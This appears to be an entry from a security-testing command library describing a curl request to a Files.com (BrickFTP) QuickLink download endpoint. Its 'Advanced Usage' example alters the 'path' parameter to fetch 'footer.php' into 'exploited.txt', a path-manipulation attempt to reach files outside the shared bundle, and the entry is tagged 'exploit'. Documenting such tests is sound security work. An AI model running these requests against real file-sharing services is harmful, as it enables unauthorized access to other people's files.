---
id: cmd-uuid-001
data: >-
  curl -X GET
  "https://pwn.brickftp.com/bundles/download?code=23a17148e&path=foo&x=767de6540"
  -o output.txt
tags:
  - http
  - download
  - exploit
type: command
output: Downloaded file contents or error message
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.479Z'
verified: false
validated: true
submitted: true
---
# curl-quicklink-download

## Command

```bash
curl -X GET "https://pwn.brickftp.com/bundles/download?code=23a17148e&path=foo&x=767de6540" -o output.txt
```

## Description

Sends a GET request to the Files.com bundles/download endpoint to download a file via QuickLink, modifiable for path exploitation. Use to test access controls by altering the 'path' parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `code` | Bundle code from QuickLink | Yes |
| `path` | File path to download (modifiable) | Yes |
| `x` | Session or token parameter | Yes |
| `-o` | Output file name | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://pwn.brickftp.com/bundles/download?code=23a17148e&path=foo&x=767de6540" -o foo.txt
```

### Advanced Usage

```bash
curl -X GET "https://pwn.brickftp.com/bundles/download?code=23a17148e&path=footer.php&x=767de6540" -o exploited.txt
```

## Expected Output

Successful: Binary file contents saved to output file. Error: JSON or text like 'Invalid path for bundle'.

## Related

- [[Related Procedure]]
